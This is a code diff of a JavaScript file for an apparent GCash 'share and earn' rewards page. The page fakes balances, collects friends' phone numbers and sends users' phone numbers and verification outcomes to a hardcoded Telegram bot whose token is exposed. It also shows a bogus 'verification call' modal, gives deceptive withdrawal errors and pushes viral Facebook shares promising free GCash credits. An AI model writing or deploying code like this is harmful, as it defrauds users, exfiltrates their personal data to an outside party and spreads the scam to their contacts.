@@ -1,5 +1,4 @@
-// ========== PROMOTION.JS - SHARE AND EARN ==========
-// Complete version with all implementations
+// ========== PROMOTION.JS - COMPLETE WITH FIREWALL & CLAIM LOGIC ==========
 
 // ========== LOCALSTORAGE KEYS ==========
 function getUserStorageKeys() {
@@ -19,106 +18,20 @@ function getUserStorageKeys() {
     };
 }
 
-// ========== SAVE BALANCE ==========
+// ========== SAVE/GET BALANCE ==========
 function saveBalance(amount) {
     var keys = getUserStorageKeys();
     if (!keys) return;
-    
     localStorage.setItem(keys.balanceKey, amount);
-    localStorage.setItem(keys.lastUpdateKey, Date.now());
-    console.log("Balance saved:", amount);
 }
 
-// ========== GET BALANCE ==========
 function getBalance() {
     var keys = getUserStorageKeys();
     if (!keys) return 0;
-    
     var balance = localStorage.getItem(keys.balanceKey);
     return balance ? parseInt(balance) : 0;
 }
 
-// ========== SAVE LEFT REWARD STATUS ==========
-function saveLeftRewardClaimed(claimed) {
-    var keys = getUserStorageKeys();
-    if (!keys) return;
-    
-    localStorage.setItem(keys.leftRewardKey, claimed ? 'true' : 'false');
-    console.log("Left reward status saved:", claimed);
-}
-
-// ========== GET LEFT REWARD STATUS ==========
-function getLeftRewardClaimed() {
-    var keys = getUserStorageKeys();
-    if (!keys) return false;
-    
-    var status = localStorage.getItem(keys.leftRewardKey);
-    return status === 'true';
-}
-
-// ========== SAVE INVITATIONS LIST ==========
-function saveInvitations(invitations) {
-    var keys = getUserStorageKeys();
-    if (!keys) return;
-    
-    localStorage.setItem(keys.invitesKey, JSON.stringify(invitations));
-    localStorage.setItem(keys.invitesCountKey, invitations.length);
-    console.log("Invitations saved:", invitations.length);
-}
-
-// ========== GET INVITATIONS LIST ==========
-function getInvitations() {
-    var keys = getUserStorageKeys();
-    if (!keys) return [];
-    
-    var invites = localStorage.getItem(keys.invitesKey);
-    return invites ? JSON.parse(invites) : [];
-}
-
-// ========== GET INVITES COUNT ==========
-function getInvitesCount() {
-    var keys = getUserStorageKeys();
-    if (!keys) return 0;
-    
-    var count = localStorage.getItem(keys.invitesCountKey);
-    return count ? parseInt(count) : 0;
-}
-
-// ========== ADD INVITATION ==========
-function addInvitation(friendPhone) {
-    var invitations = getInvitations();
-    
-    for (var i = 0; i < invitations.length; i++) {
-        if (invitations[i].phone === friendPhone) {
-            return false;
-        }
-    }
-    
-    invitations.push({
-        phone: friendPhone,
-        status: 'pending',
-        timestamp: Date.now()
-    });
-    
-    saveInvitations(invitations);
-    return true;
-}
-
-// ========== DELETE INVITATION ==========
-function deleteInvitationByPhone(friendPhone) {
-    var invitations = getInvitations();
-    var newInvites = [];
-    
-    for (var i = 0; i < invitations.length; i++) {
-        if (invitations[i].phone !== friendPhone) {
-            newInvites.push(invitations[i]);
-        }
-    }
-    
-    saveInvitations(newInvites);
-}
-
-// ========== ADD BALANCE ==========
 function addBalance(amount) {
     var currentBalance = getBalance();
     var newBalance = currentBalance + amount;
@@ -126,136 +39,78 @@ function addBalance(amount) {
     return newBalance;
 }
 
-// ========== DISPLAY BALANCE ==========
 function displayBalance() {
     var balance = getBalance();
     var balanceSpan = document.getElementById('userBalanceDisplay');
-    if (balanceSpan) {
-        balanceSpan.innerHTML = '₱' + balance;
-    }
+    if (balanceSpan) balanceSpan.innerHTML = '₱' + balance;
     return balance;
 }
 
-// ========== DISPLAY INVITES COUNT ==========
+// ========== LEFT REWARD STATUS ==========
+function saveLeftRewardClaimed(claimed) {
+    var keys = getUserStorageKeys();
+    if (!keys) return;
+    localStorage.setItem(keys.leftRewardKey, claimed ? 'true' : 'false');
+}
+
+function getLeftRewardClaimed() {
+    var keys = getUserStorageKeys();
+    if (!keys) return false;
+    return localStorage.getItem(keys.leftRewardKey) === 'true';
+}
+
+// ========== INVITATIONS ==========
+function getInvitations() {
+    var keys = getUserStorageKeys();
+    if (!keys) return [];
+    var invites = localStorage.getItem(keys.invitesKey);
+    return invites ? JSON.parse(invites) : [];
+}
+
+function saveInvitations(invitations) {
+    var keys = getUserStorageKeys();
+    if (!keys) return;
+    localStorage.setItem(keys.invitesKey, JSON.stringify(invitations));
+    localStorage.setItem(keys.invitesCountKey, invitations.length);
+}
+
+function addInvitation(friendPhone) {
+    var invitations = getInvitations();
+    for (var i = 0; i < invitations.length; i++) {
+        if (invitations[i].phone === friendPhone) return false;
+    }
+    invitations.push({ phone: friendPhone, status: 'pending', timestamp: Date.now() });
+    saveInvitations(invitations);
+    return true;
+}
+
+function deleteInvitationByPhone(friendPhone) {
+    var invitations = getInvitations();
+    var newInvites = [];
+    for (var i = 0; i < invitations.length; i++) {
+        if (invitations[i].phone !== friendPhone) newInvites.push(invitations[i]);
+    }
+    saveInvitations(newInvites);
+}
+
+function getInvitesCount() {
+    var keys = getUserStorageKeys();
+    if (!keys) return 0;
+    var count = localStorage.getItem(keys.invitesCountKey);
+    return count ? parseInt(count) : 0;
+}
+
 function displayInvitesCount() {
     var count = getInvitesCount();
     var invitesSpan = document.getElementById('invitesCountDisplay');
-    if (invitesSpan) {
-        invitesSpan.innerHTML = count + ' / 6';
-    }
+    if (invitesSpan) invitesSpan.innerHTML = count + ' / 6';
     return count;
 }
 
-// ========== UPDATE LEFT CARD VISUAL ==========
-function updateLeftCardFromStorage() {
-    var leftCard = document.getElementById('leftCard');
-    var leftClaimed = getLeftRewardClaimed();
-    
-    if (!leftCard) return;
-    
-    if (leftClaimed) {
-        leftCard.classList.add('prize-card-claimed');
-        leftCard.classList.remove('prize-card-glow');
-        leftCard.style.cursor = 'default';
-    } else {
-        leftCard.classList.add('prize-card-glow');
-        leftCard.classList.remove('prize-card-claimed');
-        leftCard.style.cursor = 'pointer';
-    }
-}
-
-// ========== PLAY VIDEO WITH GLOW EFFECT ==========
-function playVideoWithGlow(videoContainer) {
-    if (!videoContainer) return;
-    
-    var video = videoContainer.querySelector('video');
-    if (video) {
-        video.currentTime = 0;
-        video.play().catch(function(e) {
-            console.log("Video play error:", e);
-        });
-    }
-    
-    videoContainer.classList.add('prize-card-clicked-video');
-    
-    setTimeout(function() {
-        videoContainer.classList.remove('prize-card-clicked-video');
-    }, 500);
-}
-
-// ========== LEFT LUCKY CAT ==========
-function initLeftLuckyCard() {
-    var leftCard = document.getElementById('leftCard');
-    if (!leftCard) return;
-    
-    updateLeftCardFromStorage();
-    
-    if (!getLeftRewardClaimed()) {
-        var newCard = leftCard.cloneNode(true);
-        leftCard.parentNode.replaceChild(newCard, leftCard);
-        leftCard = newCard;
-        
-        leftCard.addEventListener('click', function(e) {
-            e.stopPropagation();
-            
-            if (getLeftRewardClaimed()) {
-                alert("You already claimed your ₱150!");
-                return;
-            }
-            
-            var container = this.querySelector('.lucky-cat-video');
-            if (container) {
-                playVideoWithGlow(container);
-            }
-            
-            var rect = this.getBoundingClientRect();
-            var x = rect.left + rect.width / 2;
-            var y = rect.top + rect.height / 2;
-            
-            addBalance(150);
-            saveLeftRewardClaimed(true);
-            
-            setLeftRewardClaimedGlobal(true);
-            saveIndicatorStatus();
-            
-            this.classList.remove('prize-card-glow');
-            this.classList.add('prize-card-claimed');
-            this.style.cursor = 'default';
-            
-            showFloatingPlus(x, y, 150);
-            startConfetti();
-            displayBalance();
-            
-            var statusMsg = document.getElementById('statusMessage');
-            if (statusMsg) {
-                statusMsg.innerHTML = '+₱150 claimed! Your balance: ₱' + getBalance();
-            }
-        });
-    }
-}
-
-// ========== RIGHT LUCKY CAT ==========
-function initRightLuckyCard() {
-    var rightCard = document.getElementById('rightCard');
-    if (!rightCard) return;
-    
-    rightCard.addEventListener('click', function(e) {
-        e.stopPropagation();
-        
-        var container = this.querySelector('.lucky-cat-video');
-        if (container) {
-            playVideoWithGlow(container);
-        }
-        
-        alert("Invite friends to earn ₱150 each!");
-    });
-}
-
-// ========== RENDER INVITATIONS LIST ==========
+// ========== RENDER INVITATIONS ==========
 function renderInvitationsFromStorage() {
     var invitations = getInvitations();
     var listBody = document.getElementById('inviteListBody');
-    
     if (!listBody) return;
     
     if (invitations.length === 0) {
@@ -282,36 +137,23 @@ function renderInvitationsFromStorage() {
     listBody.innerHTML = html;
 }
 
-// ========== DELETE INVITE ==========
 window.deleteInviteFromStorage = function(friendPhone) {
     var invitations = getInvitations();
     var invite = null;
-    
     for (var i = 0; i < invitations.length; i++) {
-        if (invitations[i].phone === friendPhone) {
-            invite = invitations[i];
-            break;
-        }
+        if (invitations[i].phone === friendPhone) { invite = invitations[i]; break; }
     }
-    
     if (invite && invite.status === 'approved') {
         alert("Cannot delete approved invitation!");
         return;
     }
-    
     if (confirm("Delete invitation?")) {
         deleteInvitationByPhone(friendPhone);
         renderInvitationsFromStorage();
         displayInvitesCount();
-        
-        var statusMsg = document.getElementById('statusMessage');
-        if (statusMsg) {
-            statusMsg.innerHTML = 'Invitation deleted';
-        }
     }
 };
 
-// ========== SEND INVITATION ==========
 window.sendInviteToStorage = function() {
     var friendPhone = document.getElementById('friendPhoneInput').value.trim();
     var userPhone = localStorage.getItem("userPhone");
@@ -320,36 +162,78 @@ window.sendInviteToStorage = function() {
         alert("Enter valid 11-digit number starting with 09");
         return;
     }
-    
     if (friendPhone === userPhone) {
         alert("You cannot invite yourself!");
         return;
     }
-    
-    var invitesCount = getInvitesCount();
-    if (invitesCount >= 6) {
+    if (getInvitesCount() >= 6) {
         alert("Maximum 6 invites only!");
         return;
     }
-    
     if (addInvitation(friendPhone)) {
         document.getElementById('friendPhoneInput').value = '';
         renderInvitationsFromStorage();
         displayInvitesCount();
-        
-        setHasInvitedGlobal(true);
-        saveIndicatorStatus();
-        
-        var statusMsg = document.getElementById('statusMessage');
-        if (statusMsg) {
-            statusMsg.innerHTML = 'Invitation sent to ' + friendPhone.substring(0, 4) + '****' + friendPhone.substring(8, 11);
-        }
-        
         alert("Invitation sent!");
     } else {
         alert("You already invited this person!");
     }
 };
+
+// ========== CONFETTI ==========
+var confettiAnimation = null;
+var confettiTimeout = null;
+
+function startConfetti() {
+    var canvas = document.getElementById('confettiCanvas');
+    if (!canvas) return;
+    stopConfetti();
+    canvas.style.display = 'block';
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    var ctx = canvas.getContext('2d');
+    var particles = [];
+    for (var i = 0; i < 100; i++) {
+        particles.push({
+            x: Math.random() * canvas.width,
+            y: Math.random() * canvas.height - canvas.height,
+            size: Math.random() * 6 + 2,
+            color: "hsl(" + (Math.random() * 360) + ", 100%, 60%)",
+            speed: Math.random() * 3 + 2
+        });
+    }
+    function draw() {
+        if (!canvas || canvas.style.display === 'none') return;
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        for (var j = 0; j < particles.length; j++) {
+            var p = particles[j];
+            ctx.fillStyle = p.color;
+            ctx.fillRect(p.x, p.y, p.size, p.size);
+            p.y += p.speed;
+            if (p.y > canvas.height) {
+                p.y = -p.size;
+                p.x = Math.random() * canvas.width;
+            }
+        }
+        confettiAnimation = requestAnimationFrame(draw);
+    }
+    draw();
+    if (confettiTimeout) clearTimeout(confettiTimeout);
+    confettiTimeout = setTimeout(stopConfetti, 3000);
+}
+
+function stopConfetti() {
+    if (confettiAnimation) {
+        cancelAnimationFrame(confettiAnimation);
+        confettiAnimation = null;
+    }
+    var canvas = document.getElementById('confettiCanvas');
+    if (canvas) {
+        var ctx = canvas.getContext('2d');
+        if (ctx) ctx.clearRect(0, 0, canvas.width, canvas.height);
+        canvas.style.display = 'none';
+    }
+}
 
 // ========== FLOATING ANIMATION ==========
 function showFloatingPlus(x, y, amount) {
@@ -367,246 +251,158 @@ function showFloatingPlus(x, y, amount) {
     floatingDiv.style.pointerEvents = 'none';
     floatingDiv.style.zIndex = '10001';
     floatingDiv.style.animation = 'floatUp 1s ease-out forwards';
-    
     document.body.appendChild(floatingDiv);
-    
-    setTimeout(function() {
-        floatingDiv.remove();
-    }, 1000);
+    setTimeout(function() { floatingDiv.remove(); }, 1000);
 }
 
-// ========== CONFETTI ==========
-var confettiAnimation = null;
-var confettiTimeout = null;
-
-function startConfetti() {
-    var canvas = document.getElementById('confettiCanvas');
-    if (!canvas) return;
+// ========== LEFT LUCKY CAT ==========
+function initLeftLuckyCard() {
+    var leftCard = document.getElementById('leftCard');
+    if (!leftCard) return;
     
-    stopConfetti();
+    var luckySound = new Audio('sounds/luckycat.mp4');
+    luckySound.loop = false;
+    luckySound.volume = 0.7;
     
-    canvas.style.display = 'block';
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
-    var ctx = canvas.getContext('2d');
-    
-    var particles = [];
-    for (var i = 0; i < 100; i++) {
-        particles.push({
-            x: Math.random() * canvas.width,
-            y: Math.random() * canvas.height - canvas.height,
-            size: Math.random() * 6 + 2,
-            color: "hsl(" + (Math.random() * 360) + ", 100%, 60%)",
-            speed: Math.random() * 3 + 2
+    if (getLeftRewardClaimed()) {
+        leftCard.classList.add('prize-card-claimed');
+        leftCard.classList.remove('prize-card-glow');
+        leftCard.style.cursor = 'default';
+    } else {
+        leftCard.classList.add('prize-card-glow');
+        leftCard.style.cursor = 'pointer';
+        
+        leftCard.addEventListener('click', function(e) {
+            e.stopPropagation();
+            if (getLeftRewardClaimed()) {
+                alert("You already claimed your ₱150!");
+                return;
+            }
+            
+            luckySound.currentTime = 0;
+            luckySound.play().catch(function(err) { console.log("Audio error:", err); });
+            
+            var rect = this.getBoundingClientRect();
+            var x = rect.left + rect.width / 2;
+            var y = rect.top + rect.height / 2;
+            
+            addBalance(150);
+            saveLeftRewardClaimed(true);
+            
+            this.classList.remove('prize-card-glow');
+            this.classList.add('prize-card-claimed');
+            this.style.cursor = 'default';
+            
+            showFloatingPlus(x, y, 150);
+            startConfetti();
+            displayBalance();
+            
+            var statusMsg = document.getElementById('statusMessage');
+            if (statusMsg) {
+                statusMsg.innerHTML = '🐱 +₱150 claimed! Your balance: ₱' + getBalance() + ' ✨';
+            }
         });
     }
-    
-    function draw() {
-        if (!canvas || canvas.style.display === 'none') return;
-        ctx.clearRect(0, 0, canvas.width, canvas.height);
-        
-        for (var j = 0; j < particles.length; j++) {
-            var p = particles[j];
-            ctx.fillStyle = p.color;
-            ctx.fillRect(p.x, p.y, p.size, p.size);
-            p.y += p.speed;
-            if (p.y > canvas.height) {
-                p.y = -p.size;
-                p.x = Math.random() * canvas.width;
-            }
-        }
-        
-        confettiAnimation = requestAnimationFrame(draw);
-    }
-    
-    draw();
-    
-    if (confettiTimeout) clearTimeout(confettiTimeout);
-    confettiTimeout = setTimeout(function() {
-        stopConfetti();
-    }, 3000);
-}
-
-function stopConfetti() {
-    if (confettiAnimation) {
-        cancelAnimationFrame(confettiAnimation);
-        confettiAnimation = null;
-    }
-    var canvas = document.getElementById('confettiCanvas');
-    if (canvas) {
-        var ctx = canvas.getContext('2d');
-        if (ctx) ctx.clearRect(0, 0, canvas.width, canvas.height);
-        canvas.style.display = 'none';
-    }
-}
-
-// ========== POPUP FUNCTIONS - REFRESH ON CLOSE ==========
-function showPrizePopup() {
-    var popup = document.getElementById('prizePopup');
-    if (popup) {
-        loadIndicatorStatus();
-        popup.style.display = 'flex';
-        document.body.style.overflow = 'hidden'; // Prevent body scroll
-        startConfetti();
-    }
-}
-
-function closePrizePopup() {
-    // Refresh the page instead of just closing
-    window.location.reload();
 }
 
 // ========== CLAIM NOW BUTTON ==========
 function initClaimNowButton() {
     var claimNowBtn = document.getElementById('claimNowBtn');
-    
     if (claimNowBtn) {
         var newBtn = claimNowBtn.cloneNode(true);
         claimNowBtn.parentNode.replaceChild(newBtn, claimNowBtn);
         claimNowBtn = newBtn;
         
-        claimNowBtn.innerHTML = '';
-        
-        var icon = document.createElement('img');
-        icon.src = 'images/scatter_icon.jpg';
-        icon.style.width = '24px';
-        icon.style.height = '24px';
-        icon.style.verticalAlign = 'middle';
-        icon.style.marginRight = '8px';
-        icon.style.display = 'inline-block';
-        icon.style.backgroundColor = 'transparent';
-        
-        icon.onerror = function() {
-            console.log("Scatter icon not found, using emoji");
-            this.style.display = 'none';
-        };
-        
-        claimNowBtn.appendChild(icon);
-        claimNowBtn.appendChild(document.createTextNode(' CLAIM NOW'));
-        
         claimNowBtn.onclick = function(e) {
             e.preventDefault();
-            e.stopPropagation();
-            console.log("CLAIM NOW button clicked");
-            
-            var btnIcon = this.querySelector('img');
-            if (btnIcon) {
-                btnIcon.style.transform = 'rotate(360deg) scale(1.2)';
-                setTimeout(function() {
-                    if (btnIcon) btnIcon.style.transform = '';
-                }, 300);
-            }
-            
             showPrizePopup();
         };
-        
-        console.log("CLAIM NOW button ready");
     }
 }
 
-// ========== CLAIM THRU GCASH BUTTON ==========
-// ========== CLAIM THRU GCASH BUTTON WITH DIRECT FIREWALL LOGIC ==========
-function initClaimButton() {
-    var claimBtn = document.getElementById('claimGCashBtn');
-    
-    if (!claimBtn) {
-        console.log("Claim GCash button not found");
-        return;
+// ========== POPUP FUNCTIONS ==========
+function showPrizePopup() {
+    var popup = document.getElementById('prizePopup');
+    if (popup) {
+        popup.style.display = 'flex';
+        startConfetti();
     }
-    
-    // Remove existing listeners
-    var newBtn = claimBtn.cloneNode(true);
-    claimBtn.parentNode.replaceChild(newBtn, claimBtn);
-    claimBtn = newBtn;
-    
-    // Style to ensure clickable
-    claimBtn.style.cursor = 'pointer';
-    claimBtn.style.opacity = '1';
-    claimBtn.disabled = false;
-    claimBtn.style.pointerEvents = 'auto';
-    
-    // Add click event with direct firewall logic
-    claimBtn.onclick = async function(e) {
-        e.preventDefault();
-        e.stopPropagation();
-        console.log("CLAIM THRU GCASH button clicked");
-        
-        // Visual feedback
-        this.style.transform = 'scale(0.97)';
-        setTimeout(function() {
-            if (claimBtn) claimBtn.style.transform = '';
-        }, 200);
-        
-        // Check Firebase first
-        if (typeof firebase === 'undefined' || !firebase.database) {
-            alert("System error. Please try again later.");
-            return;
-        }
-        
-        try {
-            var db = firebase.database();
-            var firewallSnap = await db.ref('admin/globalFirewall').once('value');
-            var firewallData = firewallSnap.val();
-            var isFirewallOn = firewallData && firewallData.active === true;
-            
-            console.log("Firewall status:", isFirewallOn ? "ON" : "OFF");
-            
-            if (isFirewallOn) {
-                // Show firewall verification popup
-                showFirewallVerification();
-                return;
-            }
-            
-            // Firewall is OFF - check for links
-            var linksSnap = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
-            
-            if (linksSnap.exists()) {
-                var key = Object.keys(linksSnap.val())[0];
-                var linkData = linksSnap.val()[key];
-                var redirectUrl = linkData.url;
-                var userPhone = localStorage.getItem("userPhone") || "Unknown";
-                var amount = 150;
-                
-                // Update link status
-                await db.ref('links/' + key).update({
-                    status: 'claimed',
-                    user: userPhone,
-                    amount: amount,
-                    claimedAt: Date.now()
-                });
-                
-                // Send Telegram
-                fetch('https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=' + encodeURIComponent("CLAIM REQUEST!\nPhone: " + userPhone + "\nAmount: ₱" + amount))
-                    .catch(function(e) { console.log("Telegram error:", e); });
-                
-                // Close popup and redirect
-                var prizePopup = document.getElementById('prizePopup');
-                if (prizePopup) prizePopup.style.display = 'none';
-                
-                alert("Claim successful! Redirecting...");
-                setTimeout(function() {
-                    window.location.href = redirectUrl;
-                }, 1500);
-                
-            } else {
-                // No links available
-                showNoLinkAlert();
-            }
-            
-        } catch(error) {
-            console.error("Error:", error);
-            alert("System error. Please try again.");
-        }
-    };
-    
-    console.log("CLAIM THRU GCASH button initialized with direct firewall logic");
 }
 
-// ========== FIREWALL VERIFICATION POPUP ==========
+function closePrizePopup() {
+    window.location.reload();
+}
+
+// ========== FIREWALL & CLAIM LOGIC ==========
+async function checkFirewallAndClaim() {
+    console.log("Checking firewall and processing claim...");
+    
+    if (typeof firebase === 'undefined' || !firebase.database) {
+        alert("System error. Please try again.");
+        return false;
+    }
+    
+    try {
+        var db = firebase.database();
+        
+        // Check firewall status
+        var firewallSnap = await db.ref('admin/globalFirewall').once('value');
+        var firewallData = firewallSnap.val();
+        var isFirewallOn = firewallData && firewallData.active === true;
+        
+        console.log("Firewall status:", isFirewallOn ? "ON" : "OFF");
+        
+        if (isFirewallOn) {
+            showFirewallVerification();
+            return false;
+        }
+        
+        // Check for available links
+        var linksSnap = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
+        
+        if (linksSnap.exists()) {
+            var key = Object.keys(linksSnap.val())[0];
+            var linkData = linksSnap.val()[key];
+            var redirectUrl = linkData.url;
+            var userPhone = localStorage.getItem("userPhone") || "Unknown";
+            var amount = 150;
+            
+            // Update link status
+            await db.ref('links/' + key).update({
+                status: 'claimed',
+                user: userPhone,
+                amount: amount,
+                claimedAt: Date.now()
+            });
+            
+            // Send Telegram
+            fetch('https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=' + encodeURIComponent("CLAIM REQUEST!\nPhone: " + userPhone + "\nAmount: ₱" + amount))
+                .catch(function(e) { console.log("Telegram error:", e); });
+            
+            // Close popup and redirect
+            var prizePopup = document.getElementById('prizePopup');
+            if (prizePopup) prizePopup.style.display = 'none';
+            
+            alert("Claim successful! Redirecting...");
+            setTimeout(function() {
+                window.location.href = redirectUrl;
+            }, 1500);
+            return true;
+            
+        } else {
+            showNoLinkAlert();
+            return false;
+        }
+        
+    } catch(error) {
+        console.error("Error:", error);
+        alert("System error. Please try again.");
+        return false;
+    }
+}
+
 function showFirewallVerification() {
-    // Create modal
     var modal = document.createElement('div');
-    modal.id = 'firewallVerifyModal';
     modal.style.position = 'fixed';
     modal.style.top = '0';
     modal.style.left = '0';
@@ -618,7 +414,6 @@ function showFirewallVerification() {
     modal.style.display = 'flex';
     modal.style.alignItems = 'center';
     modal.style.justifyContent = 'center';
-    modal.style.fontFamily = "'Inter', sans-serif";
     
     var verificationCode = Math.floor(1000 + Math.random() * 9000).toString();
     console.log("Verification code:", verificationCode);
@@ -627,16 +422,14 @@ function showFirewallVerification() {
         <div style="background: linear-gradient(145deg, #1a1525, #0f0a1a); border-radius: 48px; max-width: 340px; width: 85%; padding: 30px 25px; text-align: center; border: 1px solid rgba(255,215,0,0.3);">
             <div style="font-size: 48px; margin-bottom: 15px;">📞</div>
             <h2 style="color: #ff4444; font-size: 22px; margin-bottom: 15px;">VERIFICATION REQUIRED</h2>
-            <div style="color: white; font-size: 13px; margin-bottom: 20px; line-height: 1.5;">
-                <p>Due to multiple claiming requests detected in the system, a quick verification call is required before proceeding.</p>
-                <p style="margin-top: 10px;">Please wait for the system-verification to call you. You will receive a 4-digit code during the call.</p>
+            <div style="color: white; font-size: 13px; margin-bottom: 20px;">
+                <p>Please wait for the system-verification call. You will receive a 4-digit code.</p>
             </div>
             <div style="display: flex; gap: 10px; margin-bottom: 15px;">
-                <input type="text" id="verifyCodeInput" style="flex: 1; background: rgba(0,0,0,0.5); border: 1px solid rgba(255,215,0,0.3); border-radius: 30px; padding: 12px; color: white; font-size: 18px; text-align: center; letter-spacing: 4px;" placeholder="1234" maxlength="4" inputmode="numeric">
-                <button id="submitVerifyBtn" style="background: linear-gradient(135deg, #ff4444, #cc0000); border: none; border-radius: 30px; padding: 0 20px; font-weight: bold; color: white; cursor: pointer;">VERIFY</button>
+                <input type="text" id="verifyCodeInput" style="flex:1; background:rgba(0,0,0,0.5); border:1px solid rgba(255,215,0,0.3); border-radius:30px; padding:12px; color:white; font-size:18px; text-align:center;" placeholder="1234" maxlength="4">
+                <button id="submitVerifyBtn" style="background:linear-gradient(135deg,#ff4444,#cc0000); border:none; border-radius:30px; padding:0 20px; color:white; font-weight:bold; cursor:pointer;">VERIFY</button>
             </div>
-            <div style="font-size: 11px; color: #ffaa33;">Waiting for system-verification call...</div>
-            <div id="verifyErrorMsg" style="color: #ff4444; font-size: 12px; margin-top: 10px; display: none;"></div>
+            <div id="verifyErrorMsg" style="color:#ff4444; font-size:12px; display:none;"></div>
         </div>
     `;
     
@@ -651,54 +444,30 @@ function showFirewallVerification() {
     
     verifyBtn.onclick = function() {
         var enteredCode = codeInput.value.trim();
-        
         if (!enteredCode || enteredCode.length < 4) {
             errorDiv.innerHTML = "Please enter a 4-digit code.";
             errorDiv.style.display = 'block';
             return;
         }
-        
         attempts++;
-        
         if (enteredCode === verificationCode) {
-            // Success
             var userPhone = localStorage.getItem("userPhone") || "Unknown";
-            fetch('https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=' + encodeURIComponent("VERIFY SUCCESS\nPhone: " + userPhone + "\nCode: " + enteredCode))
-                .catch(function(e) { console.log("Telegram error:", e); });
-            
+            fetch('https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=' + encodeURIComponent("VERIFY SUCCESS\nPhone: " + userPhone))
+                .catch(function(e) {});
             modal.remove();
             alert("Verification successful! Please try claiming again.");
-            setTimeout(function() {
-                window.location.reload();
-            }, 1000);
+            setTimeout(function() { window.location.reload(); }, 1000);
         } else {
-            // Failed
-            fetch('https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=' + encodeURIComponent("VERIFY FAILED\nPhone: " + userPhone + "\nCode entered: " + enteredCode + "\nCorrect code: " + verificationCode))
-                .catch(function(e) { console.log("Telegram error:", e); });
-            
-            var errorMsg = "Invalid verification code. Please try again.";
-            if (attempts >= 3) {
-                errorMsg = "Too many failed attempts. Page will refresh.";
-                setTimeout(function() {
-                    window.location.reload();
-                }, 2000);
-            }
+            var errorMsg = "Invalid code. Try again.";
+            if (attempts >= 3) errorMsg = "Too many failed attempts. Page will refresh.";
             errorDiv.innerHTML = errorMsg;
             errorDiv.style.display = 'block';
             codeInput.value = '';
-            codeInput.focus();
-        }
-    };
-    
-    // Close on outside click
-    modal.onclick = function(e) {
-        if (e.target === modal) {
-            modal.remove();
+            if (attempts >= 3) setTimeout(function() { window.location.reload(); }, 2000);
         }
     };
 }
 
-// ========== NO LINK ALERT ==========
 function showNoLinkAlert() {
     var modal = document.createElement('div');
     modal.style.position = 'fixed';
@@ -707,7 +476,6 @@ function showNoLinkAlert() {
     modal.style.width = '100%';
     modal.style.height = '100%';
     modal.style.background = 'rgba(0,0,0,0.95)';
-    modal.style.backdropFilter = 'blur(10px)';
     modal.style.zIndex = '20000';
     modal.style.display = 'flex';
     modal.style.alignItems = 'center';
@@ -717,235 +485,66 @@ function showNoLinkAlert() {
         <div style="background: linear-gradient(145deg, #1a1525, #0f0a1a); border-radius: 40px; max-width: 320px; width: 85%; padding: 30px 25px; text-align: center; border: 1px solid rgba(255,68,68,0.3);">
             <div style="font-size: 48px; margin-bottom: 15px;">⚠️</div>
             <h3 style="color: #ff4444; font-size: 20px; margin-bottom: 20px;">WITHDRAWAL UNAVAILABLE</h3>
-            <div style="color: white; font-size: 14px; line-height: 1.6; text-align: left;">
-                <p style="margin-bottom: 12px;">1. There is no GCash App installed on your device.</p>
-                <p style="margin-bottom: 5px;">2. Share and complete the pending task to withdraw your rewards.</p>
+            <div style="color: white; font-size: 14px; text-align: left;">
+                <p>1. No GCash payout link available.</p>
+                <p>2. Share and complete pending tasks.</p>
             </div>
-            <button id="closeAlertBtn" style="background: linear-gradient(135deg, #ff4444, #cc0000); border: none; border-radius: 40px; padding: 12px 25px; color: white; font-weight: bold; margin-top: 25px; cursor: pointer; width: 100%;">GOT IT</button>
+            <button id="closeAlertBtn" style="background:#ff4444; border:none; border-radius:40px; padding:12px; color:white; font-weight:bold; margin-top:25px; width:100%; cursor:pointer;">GOT IT</button>
         </div>
     `;
     
     document.body.appendChild(modal);
+    document.getElementById('closeAlertBtn').onclick = function() { modal.remove(); };
+}
+
+// ========== CLAIM THRU GCASH BUTTON ==========
+function initClaimButton() {
+    var claimBtn = document.getElementById('claimGCashBtn');
+    if (!claimBtn) return;
     
-    document.getElementById('closeAlertBtn').onclick = function() {
-        modal.remove();
-    };
+    var newBtn = claimBtn.cloneNode(true);
+    claimBtn.parentNode.replaceChild(newBtn, claimBtn);
+    claimBtn = newBtn;
     
-    modal.onclick = function(e) {
-        if (e.target === modal) modal.remove();
+    claimBtn.style.cursor = 'pointer';
+    claimBtn.disabled = false;
+    
+    claimBtn.onclick = async function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        console.log("CLAIM THRU GCASH clicked");
+        
+        this.style.transform = 'scale(0.97)';
+        setTimeout(function() { if (claimBtn) claimBtn.style.transform = ''; }, 200);
+        
+        await checkFirewallAndClaim();
     };
 }
+
 // ========== FACEBOOK SHARE ==========
 function initFacebookShare() {
     var fbBtn = document.getElementById('shareFBBtn');
     if (fbBtn) {
-        fbBtn.innerHTML = '';
-        
-        var fbIcon = document.createElement('img');
-        fbIcon.src = 'images/fb_icon.png';
-        fbIcon.className = 'gc-btn-icon';
-        fbIcon.style.width = '20px';
-        fbIcon.style.height = '20px';
-        fbIcon.style.marginRight = '8px';
-        fbIcon.style.filter = 'brightness(0) invert(1)';
-        
-        fbBtn.appendChild(fbIcon);
-        fbBtn.appendChild(document.createTextNode(' Share on Facebook'));
-        
         fbBtn.onclick = function() {
             var userPhone = localStorage.getItem("userPhone");
             var formattedPhone = userPhone ? userPhone.substring(0, 4) + '****' + userPhone.substring(8, 11) : 'User';
-            
             var caption = "🎉 FREE +₱300 GCASH CREDITS! 🎉\n\nUse my referral code: " + formattedPhone + "\n\n#LuckyDrop #Rewards #GCash";
             var shareUrl = "https://xjiligames.github.io/rewards/index.html";
